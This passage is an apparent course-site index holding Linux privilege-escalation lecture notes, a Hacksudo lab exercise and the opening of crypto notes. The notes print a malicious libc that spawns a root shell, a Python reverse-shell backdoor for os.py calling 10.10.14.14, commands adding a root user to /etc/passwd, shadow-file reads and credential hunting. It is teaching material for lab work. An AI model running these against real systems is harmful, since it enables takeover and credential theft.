/lib/i386-linux-gnu/libc.so.6 (0x00110000)\n /lib/ld-linux.so.2 (0x005bb000)\n</code></pre> <p>By copying the lib into <code>/var/tmp/flag15/</code> it will be used by the program in this place as specified in the <code>RPATH</code> variable.</p> <pre><code>level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/\n\nlevel15@nebula:/home/flag15$ ldd ./flag15\n linux-gate.so.1 =&gt;  (0x005b0000)\n libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00110000)\n /lib/ld-linux.so.2 (0x00737000)\n</code></pre> <p>Then create an evil library in <code>/var/tmp</code> with <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p> <pre><code>#include&lt;stdlib.h&gt;\n#define SHELL \"/bin/sh\"\n\nint __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))\n{\n char *file = SHELL;\n char *argv[] = {SHELL,0};\n setresuid(geteuid(),geteuid(), geteuid());\n execve(file,argv,0);\n}\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#capabilities","title":"Capabilities","text":"<p>Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation. Read the following page to learn more about capabilities and how to abuse them:</p> <p>https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities</p>"},{"location":"CS315/2021/Week%2010/#directory-permissions","title":"Directory permissions","text":"<p>In a directory the bit for execute implies that the user affected can \"cd\" into the folder. The read bit implies the user can list the files, and the write bit implies the user can delete and create new files.</p>"},{"location":"CS315/2021/Week%2010/#acls","title":"ACLs","text":"<p>ACLs are a second level of discretionary permissions, that may override the standard ugo/rwx ones. When used correctly they can grant you a better granularity in setting access to a file or a directory, for example by giving or denying access to a specific user that is neither the file owner, nor in the group owner (from here). Give user \"kali\" read and write permissions over a file:</p> <pre><code>setfacl -m u:kali:rw file.txt\n</code></pre> <p>Get files with specific ACLs from the system:</p> <pre><code>getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2&gt;/dev/null\n</code></pre>"},{"location":"CS315/2021/Week%2010/#open-shell-sessions","title":"Open shell sessions","text":"<p>In old versions you may hijack some shell session of a different user (root). In newest versions you will be able to connect to screen sessions only of your own user. However, you could find interesting information inside of the session.</p>"},{"location":"CS315/2021/Week%2010/#screen-sessions-hijacking","title":"screen sessions hijacking <p>List screen sessions</p> <pre><code>screen -ls\n</code></pre> <p></p> <p>Attach to a session</p> <pre><code>screen -dr &lt;session&gt; #The -d is to detacche whoever is attached to it\nscreen -dr 3350.foo #In the example of the image\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#tmux-sessions-hijacking","title":"tmux sessions hijacking <p>Apparently this was a problem with old tmux versions. I wasn't able to hijack a tmux (v2.1) session created by root from a non-privileged user.</p> <p>List tmux sessions</p> <pre><code>tmux ls\nps aux | grep tmux #Search for tmux consoles not using default folder for sockets\ntmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess\n</code></pre> <p></p> <p>Attach to a session</p> <pre><code>tmux attach -t myname #If you write something in this session it will appears in the other opened one\ntmux attach -d -t myname #First detach the sessinos from the other console and then access it yourself\ntmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket\n</code></pre> <p>Check valentine box from HTB for an example.</p>","text":""},{"location":"CS315/2021/Week%2010/#ssh","title":"SSH","text":""},{"location":"CS315/2021/Week%2010/#debian-openssl-predictable-prng-cve-2008-0166","title":"Debian OpenSSL Predictable PRNG - CVE-2008-0166 <p>All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug. This bug caused that when creating in those OS a new ssh key only 32,768 variations were possible. This means that all the possibilities can be calculated and having the ssh public key you can search for the corresponding private key. You can find the calculated possibilities here: https://github.com/g0tmi1k/debian-ssh</p>","text":""},{"location":"CS315/2021/Week%2010/#ssh-interesting-configuration-values","title":"SSH Interesting configuration values <ul> <li>PasswordAuthentication: Specifies whether password authentication is allowed. The default is <code>no</code>.</li> <li>PubkeyAuthentication: Specifies whether public key authentication is allowed. The default is <code>yes</code>.</li> <li>PermitEmptyPasswords: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is <code>no</code>.</li> </ul>","text":""},{"location":"CS315/2021/Week%2010/#permitrootlogin","title":"PermitRootLogin","text":"<p>Specifies whether root can log in using ssh, default is <code>no</code>. Possible values:</p> <ul> <li><code>yes</code> : root can login using password and private key</li> <li><code>without-password</code> or <code>prohibit-password</code>: root can only login with private key</li> <li><code>forced-commands-only</code>: Root can login only using privatekey cand if the commands options is specified</li> <li><code>no</code> : no</li> </ul>"},{"location":"CS315/2021/Week%2010/#authorizedkeysfile","title":"AuthorizedKeysFile","text":"<p>Specifies files that contains the public keys that can be used for user authentication. I can contains tokens like <code>%h</code> , that will be replaced by the home directory. You can indicate absolute paths (starting in <code>/</code>) or relative paths from the users home. For example:</p> <pre><code>AuthorizedKeysFile    .ssh/authorized_keys access\n</code></pre> <p>That configuration will indicate that if you try to login with the private key of the user \"testusername\" ssh is going to compare the public key of your key with the ones located in <code>/home/testusername/.ssh/authorized_keys</code> and <code>/home/testusername/access</code></p>"},{"location":"CS315/2021/Week%2010/#forwardagentallowagentforwarding","title":"ForwardAgent/AllowAgentForwarding","text":"<p>SSH agent forwarding allows you to use your local SSH keys instead of leaving keys (without passphrases!) sitting on your server. So, you will be able to jump via ssh to a host and from there jump to another host using the key located in your initial host.</p> <p>You need to set this option in <code>$HOME/.ssh.config</code> like this:</p> <pre><code>Host example.com\n  ForwardAgent yes\n</code></pre> <p>Notice that if <code>Host</code> is <code>*</code> every time the user jumps to a different machine that host will be able to access the keys (which is a security issue).</p> <p>The file <code>/etc/ssh_config</code> can override this options and allow or denied this configuration. The file <code>/etc/sshd_config</code> can allow or denied ssh-agent forwarding with the keyword <code>AllowAgentForwarding</code> (default is allow).</p> <p>If you Forward Agent configured in an environment check here how to exploit it to escalate privileges.</p>"},{"location":"CS315/2021/Week%2010/#interesting-files","title":"Interesting Files","text":""},{"location":"CS315/2021/Week%2010/#profiles-files","title":"Profiles files <p>The file <code>/etc/profile</code> and the files under <code>/etc/profile.d/</code> are scripts that are executed when a user run a new shell. Therefore, if you can write or modify any of the you can escalate privileges.</p> <pre><code>ls -l /etc/profile /etc/profile.d/\n</code></pre> <p>If any weird profile script is found you should check it for sensitive details.</p>","text":""},{"location":"CS315/2021/Week%2010/#passwdshadow-files","title":"Passwd/Shadow Files <p>Depending on the OS the <code>/etc/passwd</code> and <code>/etc/shadow</code> files may be using a different name or there may be a backup. Therefore it's recommended find all of hem and check if you can read them and check if there are hashes inside the files:</p> <pre><code>#Passwd equivalent files\ncat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2&gt;/dev/null\n#Shadow equivalent files\ncat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2&gt;/dev/null\n</code></pre> <p>In some occasions you can find password hashes inside the <code>/etc/passwd</code> (or equivalent) file</p> <pre><code>grep -v '^[^:]*:[x\\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2&gt;/dev/null\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#writable-etcpasswd","title":"Writable /etc/passwd","text":"<p>First generate a password with one of the following commands.</p> <pre><code>openssl passwd -1 -salt hacker hacker\nmkpasswd -m SHA-512 hacker\npython2 -c 'import crypt; print crypt.crypt(\"hacker\", \"$6$salt\")'\n</code></pre> <p>Then add the user <code>hacker</code> and add the generated password.</p> <pre><code>hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash\n</code></pre> <p>E.g: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p> <p>You can now use the <code>su</code> command with <code>hacker:hacker</code></p> <p>Alternatively you can use the following lines to add a dummy user without a password. WARNING: you might degrade the current security of the machine.</p> <pre><code>echo 'dummy::0:0::/root:/bin/bash' &gt;&gt;/etc/passwd\nsu - dummy\n</code></pre> <p>NOTE: In BSD platforms <code>/etc/passwd</code> is located at <code>/etc/pwd.db</code> and <code>/etc/master.passwd</code>, also the <code>/etc/shadow</code> is renamed to <code>/etc/spwd.db</code>.</p> <p>You should check if you can write in some sensitive file. For example, can you write to some service configuration file?</p> <pre><code>find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2&gt;/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody\nfor g in `groups`; do find \\( -type f -or -type d \\) -group $g -perm -g=w 2&gt;/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user\n</code></pre> <p>For example, if the machine is running a tomcat server and you can modify the Tomcat service configuration file inside /etc/systemd/, then you can modify the lines:</p> <pre><code>ExecStart=/path/to/backdoor\nUser=root\nGroup=root\n</code></pre> <p>Your backdoor will be executed the next time that tomcat is started.</p>"},{"location":"CS315/2021/Week%2010/#check-folders","title":"Check Folders <p>The following folders may contain backups or interesting information: /tmp, /var/tmp, /var/backups, /var/mail, /var/spool/mail, /etc/exports, /root (Probably you won't be able to read the last one but try)</p> <pre><code>ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#weird-locationowned-files","title":"Weird Location/Owned files <pre><code>#root owned files in /home folders\nfind /home -user root 2&gt;/dev/null\n#Files owned by other users in folders owned by me\nfor d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2&gt;/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \\; 2&gt;/dev/null; done\n#Files owned by root, readable by me but no world readable\nfind / -type f -user root ! -perm -o=r 2&gt;/dev/null\n#Files owned by me or world writable\nfind / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path \"/proc/*\" ! -path \"/sys/*\" ! -path \"$HOME/*\" 2&gt;/dev/null\n#Writable files by each group I belong to\nfor g in `groups`;\n      do printf \"  Group $g:\\n\";\n      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path \"/proc/*\" ! -path \"/sys/*\" ! -path \"$HOME/*\" 2&gt;/dev/null\n      done\ndone\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#modified-files-in-last-mins","title":"Modified files in last mins <pre><code>find / -type f -mmin -5 ! -path \"/proc/*\" ! -path \"/sys/*\" ! -path \"/run/*\" ! -path \"/dev/*\" ! -path \"/var/lib/*\" 2&gt;/dev/null\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#sqlite-db-files","title":"Sqlite DB files <pre><code>find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2&gt;/dev/null\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#_history-sudo_as_admin_successful-profile-bashrc-httpdconf-plan-htpasswd-git-credentials-rhosts-hostsequiv-dockerfile-docker-composeyml-files","title":"*_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files <pre><code>fils=`find / -type f \\( -name \"*_history\" -o -name \".sudo_as_admin_successful\" -o -name \".profile\" -o -name \"*bashrc\" -o -name \"httpd.conf\" -o -name \"*.plan\" -o -name \".htpasswd\" -o -name \".git-credentials\" -o -name \"*.rhosts\" -o -name \"hosts.equiv\" -o -name \"Dockerfile\" -o -name \"docker-compose.yml\" \\) 2&gt;/dev/null`Hidden files\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#hidden-files","title":"Hidden files <pre><code>find / -type f -iname \".*\" -ls 2&gt;/dev/null\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#scriptbinaries-in-path","title":"Script/Binaries in PATH <pre><code>for d in `echo $PATH | tr \":\" \"\\n\"`; do find $d -name \"*.sh\" 2&gt;/dev/null; done\nfor d in `echo $PATH | tr \":\" \"\\n\"`; do find $d -type -f -executable 2&gt;/dev/null; done\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#web-files","title":"Web files <pre><code>ls -alhR /var/www/ 2&gt;/dev/null\nls -alhR /srv/www/htdocs/ 2&gt;/dev/null\nls -alhR /usr/local/www/apache22/data/\nls -alhR /opt/lampp/htdocs/ 2&gt;/dev/null\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#backups","title":"Backups <pre><code>find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \\( -name \"*backup*\" -o -name \"*\\.bak\" -o -name \"*\\.bck\" -o -name \"*\\.bk\" \\) 2&gt;/dev/nulll\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#known-files-containing-passwords","title":"Known files containing passwords <p>Read the code of linPEAS, it searches for several possible files that could contain passwords. Other interesting tool that you can use to do so is: LaZagne which is an open source application used to retrieve lots of passwords stored on a local computer for Windows, Linux &amp; Mac.</p>","text":""},{"location":"CS315/2021/Week%2010/#logs","title":"Logs <p>If you can read logs, you may be able to find interesting/confidential information inside of them. The more strange the log is, the more interesting will be (probably). Also, some \"bad\" configured (backdoored?) audit logs may allow you to record passwords inside audit logs as explained in this post: https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/.</p> <pre><code>aureport --tty | grep -E \"su |sudo \" | sed -E \"s,su|sudo,${C}[1;31m&amp;${C}[0m,g\"\ngrep -RE 'comm=\"su\"|comm=\"sudo\"' /var/log* 2&gt;/dev/null\n</code></pre> <p>In order to read logs the group adm will be really helpful.</p>","text":""},{"location":"CS315/2021/Week%2010/#shell-files","title":"Shell files <pre><code>~/.bash_profile # if it exists, read once when you log in to the shell\n~/.bash_login # if it exists, read once if .bash_profile doesn't exist\n~/.profile # if it exists, read once if the two above don't exist\n/etc/profile # only read if none of the above exist\n~/.bashrc # if it exists, read every time you start a new shell\n~/.bash_logout # if it exists, read when the login shell exits\n~/.zlogin #zsh shell\n~/.zshrc #zsh shell\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#generic-creds-searchregex","title":"Generic Creds Search/Regex <p>You should also check for files containing the word \"password\" in it's name or inside the content, also check for IPs and emails inside logs, or hashes regexps. I'm not going to list here how to do all of this but if you are interested you can check the last checks that linpeas perform.</p>","text":""},{"location":"CS315/2021/Week%2010/#writable-files","title":"Writable files","text":""},{"location":"CS315/2021/Week%2010/#python-library-hijacking","title":"Python library hijacking <p>If you know from where a python script is going to be executed and you can write inside that folder or you can modify python libraries, you can modify the os library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).</p> <p>To backdoor the library just add at the end of the os.py library the following line (change IP and PORT):</p> <pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.14\",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#logrotate-exploitation","title":"Logrotate exploitation <p>There is a vulnerability on <code>logrotate</code>that allows a user with write permissions over a log file or any of its parent directories to make <code>logrotate</code>write a file in any location. If logrotate is being executed by root, then the user will be able to write any file in /etc/bash_completion.d/ that will be executed by any user that login. So, if you have write perms over a log file or any of its parent folder, you can privesc (on most linux distributions, logrotate is executed automatically once a day as user root). Also, check if apart of /var/log there are more files being rotated.</p> <p>This vulnerability affects <code>logrotate</code> version <code>3.15.1</code> and below</p> <p>More detailed information about the vulnerability can be found in this page: https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition.</p> <p>You can exploit this vulnerability with logrotten.</p> <p>This vulnerability is very similar to CVE-2016-1247 (nginx logs), so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.</p>","text":""},{"location":"CS315/2021/Week%2010/#etcsysconfignetwork-scripts-centosredhat","title":"/etc/sysconfig/network-scripts/ (Centos/Redhat) <p>If, for whatever reason, a user is able to write an <code>ifcf-&lt;whatever&gt;</code> script to /etc/sysconfig/network-scripts or it can adjust an existing one, then your system is pwned.</p> <p>Network scripts, ifcg-eth0 for example are used for network connections. The look exactly like .INI files. However, they are ~~sourced~~ on Linux by Network Manager (dispatcher.d).</p> <p>In my case, the <code>NAME=</code> attributed in these network scripts is not handled correctly. If you have white/blank space in the name the system tries to execute the part after the white/blank space. Which means; everything after the first blank space is executed as root.</p> <p>For example: /etc/sysconfig/network-scripts/ifcfg-1337</p> <pre><code>NAME=Network /bin/id\nONBOOT=yes\nDEVICE=eth0\n</code></pre> <p>(Note the black space between Network and /bin/id)</p> <p>Vulnerability reference: https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</p>","text":""},{"location":"CS315/2021/Week%2010/#init-initd-systemd-and-rcd","title":"init, init.d, systemd, and rc.d <p><code>/etc/init.d</code> contains scripts used by the System V init tools (SysVinit). This is the traditional service management package for Linux, containing the <code>init</code> program (the first process that is run when the kernel has finished initializing\u00b9) as well as some infrastructure to start and stop services and configure them. Specifically, files in <code>/etc/init.d</code> are shell scripts that respond to <code>start</code>, <code>stop</code>, <code>restart</code>, and (when supported) <code>reload</code> commands to manage a particular service. These scripts can be invoked directly or (most commonly) via some other trigger (typically the presence of a symbolic link in <code>/etc/rc?.d/</code>). (From here) Other alternative to this folder is <code>/etc/rc.d/init.d</code> in Redhat</p> <p><code>/etc/init</code> contains configuration files used by Upstart. Upstart is a young service management package championed by Ubuntu. Files in <code>/etc/init</code> are configuration files telling Upstart how and when to <code>start</code>, <code>stop</code>, <code>reload</code> the configuration, or query the <code>status</code> of a service. As of lucid, Ubuntu is transitioning from SysVinit to Upstart, which explains why many services come with SysVinit scripts even though Upstart configuration files are preferred. In fact, the SysVinit scripts are processed by a compatibility layer in Upstart. (From here)</p> <p>systemd is a Linux initialization system and service manager that includes features like on-demand starting of daemons, mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks. (From here) Files that ships in packages downloaded from distribution repository go into <code>/usr/lib/systemd/</code>. Modifications done by system administrator (user) go into <code>/etc/systemd/system/</code>.</p>","text":""},{"location":"CS315/2021/Week%2010/#other-tricks","title":"Other Tricks","text":""},{"location":"CS315/2021/Week%2010/#nfs-privilege-escalation","title":"NFS Privilege escalation <p>https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe</p>","text":""},{"location":"CS315/2021/Week%2010/#escaping-from-restricted-shells","title":"Escaping from restricted Shells <p>https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash</p>","text":""},{"location":"CS315/2021/Week%2010/#cisco-vmanage","title":"Cisco - vmanage <p>https://book.hacktricks.xyz/linux-unix/privilege-escalation/cisco-vmanage</p>","text":""},{"location":"CS315/2021/Week%2010/#kernel-security-protections","title":"Kernel Security Protections <ul> <li>https://github.com/a13xp0p0v/kconfig-hardened-check</li> <li>https://github.com/a13xp0p0v/linux-kernel-defence-map</li> </ul>","text":""},{"location":"CS315/2021/Week%2010/#more-help","title":"More help","text":"<p>Static impacket binaries</p>"},{"location":"CS315/2021/Week%2010/#linuxunix-privesc-tools","title":"Linux/Unix Privesc Tools","text":""},{"location":"CS315/2021/Week%2010/#best-tool-to-look-for-linux-local-privilege-escalation-vectors-linpeas","title":"Best tool to look for Linux local privilege escalation vectors: LinPEAS","text":"<p>LinEnum: https://github.com/rebootuser/LinEnum(-t option) Enumy: https://github.com/luke-goddard/enumy Unix Privesc Check: http://pentestmonkey.net/tools/audit/unix-privesc-check Linux Priv Checker: www.securitysift.com/download/linuxprivchecker.py BeeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Linux Kernelpop: Enumerate kernel vulns ins linux and MAC https://github.com/spencerdodd/kernelpop Mestaploit: multi/recon/local_exploit_suggester Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester EvilAbigail (physical access): https://github.com/GDSSecurity/EvilAbigail Recopilation of more scripts: https://gh-dark.rauchg.now.sh/1N3/PrivEsc/tree/master/linux</p>"},{"location":"CS315/2021/Week%2010/#bibliography","title":"Bibliography <p>https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://payatu.com/guide-linux-privilege-escalation/ https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744 http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html https://touhidshaikh.com/blog/?p=827 https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf https://github.com/frizb/Linux-Privilege-Escalation https://github.com/lucyoa/kernel-exploits https://github.com/rtcrowley/linux-private-i</p>","text":""},{"location":"CS315/2021/Week%2010/#exercise","title":"Exercise","text":""},{"location":"CS315/2021/Week%2010/#10-pt-hacksudo","title":"(10 pt) Hacksudo <p>In this challenge, you need to download the following virtual machine to finish the challenges.</p> <p>The box was created with <code>Virtualbox</code>. Upon booting up use <code>netdiscover</code> tool to find the IP address. This is the target address based on whatever settings you have. You should verify the address just in case.</p> <p>You don't need to answer all questions in order. Skip some questions may not affect the next steps.</p> <p>Download: https://mega.nz/file/ix9VnA7Y#7LM1LXBta_kAeNrajXGkQhmwfbr5fIaQHykkWEPBjZY</p> <p>Mirror: https://pan.baidu.com/s/1D-YEa6cr3rcWXv49HgZtSw (Code: 1337)</p>","text":""},{"location":"CS315/2021/Week%2010/#setup","title":"Setup","text":"<p>Environment setup should use <code>VirtualBox</code> history version (VirtualBox 6.1.28 has a bug with Hyper-V, I used VirtualBox 6.0.24 and worked properly). You should setup <code>Network</code> as the following:</p> <p></p> <p>The virtual image should enter the following promption:</p> <pre><code>Debian GNU/Linux 10 hacksudo fog tty1\neth0: 192.168.xx.xxx\nhacksudo login: _\n</code></pre> <p>The second line is the ip address of virtual machine.</p> <p>Open your web browser, you can find this page in VM's ip address:</p> <p></p> <p>You are done with configuration, now you can hack the machine and solve the challenges!</p> <p>If the ip address hasn't shown up, you can find it as below:</p> <p>Open you terminal (powershell.exe in Windows), and use <code>ipconfig /all</code> to find your <code>Host-only NET</code> ip address.</p> <p></p> <p>Use any tool to scan the ip <code>192.168.xx.0/24</code> and you can find the virtual machine ip address. Otherwise, you can also use <code>arp -a</code> to find your <code>Host-only Network</code> address, and usually VM's ip address is followed.</p> <p></p>"},{"location":"CS315/2021/Week%2010/#1-pt-port-scan","title":"(1 pt) Port scan","text":"<p>After the port scan, you should find several services running in the box. What's the version of the <code>mysql</code> service?</p> <p>Answer: <code>x.x.x-xx.x.xx-MariaDB-x+debxxxx</code> (replace all x to your answer)</p> <p>Hint: you can use nmap for port scanning.</p>"},{"location":"CS315/2021/Week%2010/#1-pt-web-source-code","title":"(1 pt) Web source code","text":"<p>Access the website on port <code>80</code>. You can find here's some hint for the subsequent steps. What's the GitHub repo address you found in the source code?</p> <p>Answer: <code>https://github.com/xxxxxxxx/xxxxxxxxxxx</code> (replace all x to your answer)</p> <p>Hint: press F12 on the keyboard to open the Developer's Tools to view the source code (may vary for different browsers).</p>"},{"location":"CS315/2021/Week%2010/#1-pt-web-directory-discover","title":"(1 pt) Web directory discover","text":"<p>Using web directory scanning, you can find a <code>txt</code> file under the website. What's the name of this <code>txt</code> file?</p> <p>Answer: <code>xxxx.txt</code> (replace all x to your answer)</p> <p>Hint: gobuster and dirbuster are both good web directory/file discovery tools.</p>"},{"location":"CS315/2021/Week%2010/#1-pt-cms-vulnerability","title":"(1 pt) CMS vulnerability","text":"<p>The CMS used in the website is <code>CMS-MadeSimple</code>. However, this CMS can be vulnerable in some versions. What's the version of CMS?</p> <p>Answer: <code>x.x.x</code> (replace all x to your answer)</p> <p>Hint: you can use whatweb to find out the version of services.</p>"},{"location":"CS315/2021/Week%2010/#1-pt-exploit-cms","title":"(1 pt) Exploit CMS","text":"<p>Now, using the vulnerability to find the username and the hashed password of the CMS. It's hard to break the hash string, but you can use this username to break other services on the server. The <code>txt</code> file you found above would help you to get the password for the <code>ftp</code> service on port <code>21</code>.</p> <p>What's the password (in plain text)?</p> <p>Answer: <code>xxxxxx</code> (replace all x to your answer)</p> <p>Hint: hydra is a widely used tool for password cracking.</p>"},{"location":"CS315/2021/Week%2010/#1-pt-ftp-and-unzip","title":"(1 pt) FTP and unzip","text":"<p>Using the previous username and password, you can log into the FTP server. You may notice there's a <code>zip</code> file on the server. You need to break the password of the <code>zip</code> file.</p> <p>What's the password for the <code>zip</code> file?</p> <p>Answer: <code>xxxxxx</code> (replace all x to your answer)</p> <p>Hint: to crack the password of the zip files, you can check JohnTheRipper.</p>"},{"location":"CS315/2021/Week%2010/#1-pt-caesar-cipher","title":"(1 pt) Caesar Cipher","text":"<p>After extracting the <code>hacksudoSTEGNO.wav</code>, you need to find what's inside this file. Recall what you've got till now, and find the CMS password.</p> <p>What's the password for CMS?</p> <p>Answer: <code>xxxxxxxxxxxx</code> (replace all x to your answer)</p> <p>Hint: CyberChef contains many useful cryptography tools.</p>"},{"location":"CS315/2021/Week%2010/#1-pt-upload-rce-script","title":"(1 pt) Upload RCE script","text":"<p>You've got the CMS! Now you can enjoy accessing all website pages and put your files on the website. Why not let us dig deeper?</p> <p>Upload a PHP script to give you shell access.</p> <p>What's the first line of <code>flag2.txt</code> on the server?</p> <p>Answer: <code>xxx xxxxxxxxxxxx xxxxx xxx xxx xxx xxxxx xxxxxx!!!</code> (replace all x to your answer)</p> <p>Hint: here are some upload limits on the server. Find out how to bypass them.</p> <p>Hint: after uploading your RCE script, you can generate a reversed shell to get a pty shell (which would simplify your next steps).</p>"},{"location":"CS315/2021/Week%2010/#1-pt-local-privilege-escalation","title":"(1 pt) Local privilege escalation","text":"<p>User <code>isro</code> is your first target. Attack and switch to user <code>isro</code>. View the files of <code>isro</code>. What's the content of <code>user.txt</code>?</p> <p>Answer: <code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code> (replace all x to your answer)</p> <p>Hint: /etc/shadow is a sensitive file and may contain a user hashed password.</p>"},{"location":"CS315/2021/Week%2010/#1-pt-root-privilege-escalation","title":"(1 pt) Root privilege escalation","text":"<p>The final step: get <code>root</code> privilege. What's the content in the <code>root.txt</code>?</p> <p>Answer: <code>flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}</code> (replace all x to your answer)</p> <p>Hint: sudo has some suid things and you should take a look at them.</p>"},{"location":"CS315/2021/Week%2011/","title":"Week11 CRYPTO: Public Key Crypto Attacking","text":"<p>According to the @CTF101: https://ctf101.org/</p> <p>Cryptography is the reason we can use banking apps, transmit sensitive information over the web, and in general protect our privacy. However, a large part of CTFs is breaking widely used encryption schemes which are improperly implemented. The math may seem daunting, but more often than not, a simple understanding of the underlying principles will allow you to find flaws and crack the code.</p> <p>The word \u201ccryptography\u201d technically means the art of writing codes. When it comes to digital forensics, it\u2019s a method you can use to understand how data is constructed for your analysis.</p>"},{"location":"CS315/2021/Week%2011/#what-is-cryptography-used-for","title":"What is cryptography used for?","text":"<p>Uses in every day software</p> <ul> <li>Securing web traffic (passwords, communication, etc.)</li> <li>Securing copyrighted software code</li> </ul> <p>Malicious uses</p> <ul> <li>Hiding malicious communication</li> <li>Hiding malicious code</li> </ul>"},{"location":"CS315/2021/Week%2011/#topics","title":"Topics","text":"<ul> <li>XOR</li> <li>Cesear Cipher</li> <li>Substitution Cipher</li> <li>Vigenere Cipher</li> <li>Hashing Functions</li> <li>RSA</li> </ul>"},{"location":"CS315/2021/Week%2011/#xor","title":"XOR","text":""},{"location":"CS315/2021/Week%2011/#data-representation","title":"Data Representation","text":"<p>Data can be represented in different bases, an 'A' needs to be a numerical representation of Base 2 or binary so computers can understand them</p> <p></p>"},{"location":"CS315/2021/Week%2011/#xor-basics","title":"XOR Basics","text":"<p>An XOR or eXclusive OR is a bitwise operation indicated by <code>^</code> and shown by the following truth table:</p> A B A ^ B 0 0 0 0 1 1 1 0 1 1 1 0 <p>So what XOR'ing bytes in the action <code>0xA0 ^ 0x2C</code> translates to is:</p> 1 0 1 0 0 0 0 0 0 0 1 0 1 1 0 0 1 0 0 0 1 1 0 0 <pre><code>0b10001100` is equivelent to `0x8C`, a cool property of XOR is that it is reversable meaning `0x8C ^ 0x2C = 0xA0` and `0x8C ^ 0xA0 = 0x2C\n</code></pre> <p></p>"},{"location":"CS315/2021/Week%2011/#what-does-this-have-to-do-with-ctf","title":"What does this have to do with CTF?","text":"<p>XOR is a cheap way to encrypt data with a password. Any data can be encrypted using XOR as shown in this Python example:</p> <pre><code>&gt;&gt;&gt; data = 'CAPTURETHEFLAG'\n&gt;&gt;&gt; key = 'A'\n&gt;&gt;&gt; encrypted = ''.join([chr(ord(x) ^ ord(key)) for x in data])\n&gt;&gt;&gt; encrypted\n'\\x02\\x00\\x11\\x15\\x14\\x13\\x04\\x15\\t\\x04\\x07\\r\\x00\\x06'\n&gt;&gt;&gt; decrypted = ''.join([chr(ord(x) ^ ord(key)) for x in encrypted])\n&gt;&gt;&gt; decrypted\n'CAPTURETHEFLAG'\n</code></pre> <p>This can be extended using a multibyte key by iterating in parallel with the data.</p>"},{"location":"CS315/2021/Week%2011/#exploiting-xor-encryption","title":"Exploiting XOR Encryption","text":""},{"location":"CS315/2021/Week%2011/#single-byte-xor-encryption","title":"Single Byte XOR Encryption","text":"<p>Single Byte XOR 